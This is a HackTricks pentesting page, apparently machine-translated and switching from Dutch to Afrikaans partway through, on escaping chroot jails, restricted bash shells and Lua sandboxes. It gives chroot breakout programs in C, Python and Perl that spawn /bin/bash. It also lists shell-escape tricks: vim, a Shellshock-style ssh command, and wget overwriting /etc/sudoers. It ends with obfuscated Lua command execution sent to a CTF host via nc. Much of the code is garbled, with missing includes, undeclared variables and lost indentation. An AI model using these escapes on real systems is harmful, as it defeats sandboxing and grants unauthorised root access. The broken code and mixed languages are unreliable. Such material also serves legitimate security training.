# Escaping from Jails

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere manieren om HackTricks te ondersteunen:

* Als je je **bedrijf wilt adverteren in HackTricks** of **HackTricks wilt downloaden in PDF**, bekijk dan de [**ABONNEMENTSPAKKETTEN**](https://github.com/sponsors/carlospolop)!
* Koop de [**officiële PEASS & HackTricks-merchandise**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), onze collectie exclusieve [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit je aan bij de** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of de [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel je hacktrucs door PR's in te dienen bij de** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## **GTFOBins**

**Zoek in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **of je een binair bestand kunt uitvoeren met de eigenschap "Shell"**

## Ontsnapping uit Chroot

Van [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Het chroot-mechanisme is **niet bedoeld** om te beschermen tegen opzettelijke manipulatie door **bevoorrechte** (**root**) **gebruikers**. Op de meeste systemen worden chroot-contexten niet correct gestapeld en kunnen gechroote programma's **met voldoende privileges een tweede chroot uitvoeren om te ontsnappen**.\
Meestal betekent dit dat je root moet zijn binnen de chroot om te ontsnappen.

{% hint style="success" %}
De **tool** [**chw00t**](https://github.com/earthquake/chw00t) is gemaakt om misbruik te maken van de volgende scenario's en te ontsnappen uit `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Als je **root** bent binnen een chroot, kun je ontsnappen door een **andere chroot** te maken. Dit komt doordat 2 chroots niet naast elkaar kunnen bestaan (in Linux), dus als je een map maakt en vervolgens een **nieuwe chroot** maakt in die nieuwe map terwijl je **buiten de chroot** bent, bevind je je nu **buiten de nieuwe chroot** en ben je dus in het bestandssysteem.

Dit gebeurt omdat chroot meestal je werkmap niet verplaatst naar de aangegeven map, dus je kunt een chroot maken maar er buiten blijven.
{% endhint %}

Meestal vind je het `chroot`-binair bestand niet binnen een chroot-gevangenis, maar je **kunt een binair bestand compileren, uploaden en uitvoeren**:

<details>

<summary>C: break_chroot.c</summary>

\`\`\`c #include #include #include

//gcc break\_chroot.c -o break\_chroot

int main(void) { mkdir("chroot-dir", 0755); chroot("chroot-dir"); for(int i = 0; i < 1000; i++) { chdir(".."); } chroot("."); system("/bin/bash"); }

````
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
````

</details>

<details>

<summary>Perl</summary>

\`\`\`perl #!/usr/bin/perl mkdir "chroot-dir"; chroot "chroot-dir"; foreach my $i (0..1000) { chdir ".." } chroot "."; system("/bin/bash"); \`\`\`

</details>

### Root + Opgeslagen fd

{% hint style="warning" %}
Dit is soortgelyk aan die vorige geval, maar in hierdie geval **stoor die aanvaller 'n lêerbeskrywer na die huidige gids** en skep dan die chroot in 'n nuwe gids. Uiteindelik, omdat hy **toegang** het tot daardie **FD buite** die chroot, het hy toegang daartoe en **ontsnap** hy.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>

\`\`\`c #include #include #include

//gcc break\_chroot.c -o break\_chroot

int main(void) { mkdir("tmpdir", 0755); dir\_fd = open(".", O\_RDONLY); if(chroot("tmpdir")){ perror("chroot"); } fchdir(dir\_fd); close(dir\_fd); for(x = 0; x < 1000; x++) chdir(".."); chroot("."); }

````
</details>

### Root + Fork + UDS (Unix Domain Sockets)

<div data-gb-custom-block data-tag="hint" data-style='warning'>

FD kan oorgedra word oor Unix Domain Sockets, so:

* Skep 'n kinderproses (fork)
* Skep UDS sodat ouer en kind kan kommunikeer
* Voer chroot uit in kinderproses in 'n ander vouer
* In ouer proses, skep 'n FD van 'n vouer wat buite die nuwe kinderproses se chroot is
* Gee daardie FD aan die kinderproses deur die UDS te gebruik
* Kindproses chdir na daardie FD, en omdat dit buite sy chroot is, sal hy die tronk ontsnap

</div>

### &#x20;Root + Mount

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Monteer die roetetoestel (/) in 'n gids binne die chroot
* Chroot in daardie gids

Dit is moontlik in Linux

</div>

### Root + /proc

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Monteer procfs in 'n gids binne die chroot (as dit nog nie is nie)
* Soek na 'n pid wat 'n verskillende roet/cwd inskrywing het, soos: /proc/1/root
* Chroot in daardie inskrywing

</div>

### Root(?) + Fork

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Skep 'n Fork (kinderproses) en chroot in 'n ander vouer dieper in die FS en CD daarop
* Vanuit die ouerproses, skuif die vouer waar die kinderproses in is na 'n vouer voor die chroot van die kinders
* Hierdie kinderproses sal homself buite die chroot vind

</div>

### ptrace

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* 'n Tyd gelede kon gebruikers hul eie prosesse vanuit 'n proses van hulself afkamp... maar dit is nie meer standaard moontlik nie
* In elk geval, as dit moontlik is, kan jy ptrace in 'n proses doen en 'n shellcode daarin uitvoer ([sien hierdie voorbeeld](linux-capabilities.md#cap\_sys\_ptrace)).

</div>

## Bash Tronke

### Opname

Kry inligting oor die tronk:
```bash
echo $SHELL
echo $PATH
env
export
pwd
````

#### Wysig PATH

Kyk of jy die PATH-omgewingsveranderlike kan wysig.

```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```

#### Gebruik van vim

Vim is 'n kragtige teksredigeerder wat gebruik kan word om lêers te wysig en te skep. Dit kan ook gebruik word as 'n hulpmiddel vir priviligie-escalasie in 'n beperkte bash-omgewing.

Om vim te gebruik, voer die volgende opdrag in die beperkte bash-omgewing in:

```bash
vim
```

Dit sal vim in die beperkte omgewing aktiveer. Jy kan dan die volgende stappe volg om priviligie-escalasie te probeer:

1. Druk die `Esc`-sleutel om in die bevelsmodus te gaan.
2. Tik `:set shell=/bin/bash` en druk `Enter` om die skulprigting van die shell te verander na die volledige bash-omgewing.
3. Tik `:shell` en druk `Enter` om 'n nuwe bash-sessie te begin met volle toegang.

Hierdie tegniek kan gebruik word om beperkte bash-omgewings te ontsnap en toegang te verkry tot volle beheer oor die stelsel.

```bash
:set shell=/bin/sh
:shell
```

#### Skep skrip

Kyk of jy 'n uitvoerbare lêer met _/bin/bash_ as inhoud kan skep

```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```

#### Kry bash vanaf SSH

As jy toegang verkry via ssh, kan jy hierdie truuk gebruik om 'n bash-skulp te hardloop:

```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```

#### Verklaar

```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```

#### Wget

Jy kan byvoorbeeld die sudoers-lêer oorskryf.

```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```

#### Ander truuks

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**Dit kan ook interessant wees die bladsy:**

### Python Tronke

Truuks oor ontsnapping uit python tronke op die volgende bladsy:

### Lua Tronke

Op hierdie bladsy kan jy die globale funksies vind waarop jy toegang het binne lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval met opdrag uitvoering:**

```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```

Sommige truuks om **funksies van 'n biblioteek te roep sonder om punte te gebruik**:

```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```

Enumerasie van funksies van 'n biblioteek:

```bash
for k,v in pairs(string) do print(k,v) end
```

Let wel, elke keer as jy die vorige een-regel kode in 'n **verskillende lua-omgewing uitvoer, verander die volgorde van die funksies**. Daarom, as jy 'n spesifieke funksie wil uitvoer, kan jy 'n brute force-aanval uitvoer deur verskillende lua-omgewings te laai en die eerste funksie van die le-biblioteek aan te roep:

```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```

**Kry interaktiewe lua-skaal**: As jy binne 'n beperkte lua-skaal is, kan jy 'n nuwe lua-skaal (en hopelik onbeperkte) kry deur die volgende te roep:

```bash
debug.debug()
```

### Verwysings

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Dia's: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))



</details>
